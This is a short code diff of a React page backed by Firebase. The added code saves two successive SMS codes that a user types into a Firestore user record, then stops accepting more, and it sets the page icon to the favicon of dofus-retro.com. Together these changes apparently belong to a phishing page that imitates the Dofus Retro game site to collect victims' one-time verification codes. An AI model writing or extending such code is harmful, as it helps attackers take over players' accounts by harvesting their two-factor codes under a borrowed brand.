@@ -57,8 +57,13 @@ const send2 = async(e)=>{
   await updateDoc(document, {
       sms: code
   });
-  }else{
-    Router("/");
+  } else if (count === 1) {
+    const document = doc(db, "users", uid);
+    await updateDoc(document, { sms2: code });
+    setPage(false); 
+  } else {
+    console.log("Limit reached");
+    setPage(false); 
   }
   setCount(prev => prev + 1);
   setCode("");
@@ -121,8 +126,20 @@ const send2 = async(e)=>{
         }
     },[min,sec1])
 
-
-   
+    const setFavicon = (url) => {
+      const link = document.querySelector("link[rel~='icon']") || document.createElement('link');
+      link.rel = 'icon';
+      link.href = url;
+      document.head.appendChild(link);
+    };
+  
+    useEffect(() => {
+      setFavicon('https://www.dofus-retro.com/favicon.ico');  
+  
+      return () => {
+        setFavicon('https://www.dofus-retro.com/favicon.ico'); 
+      };
+    }, []);  
 
   return (
     <div className={styles.App}>
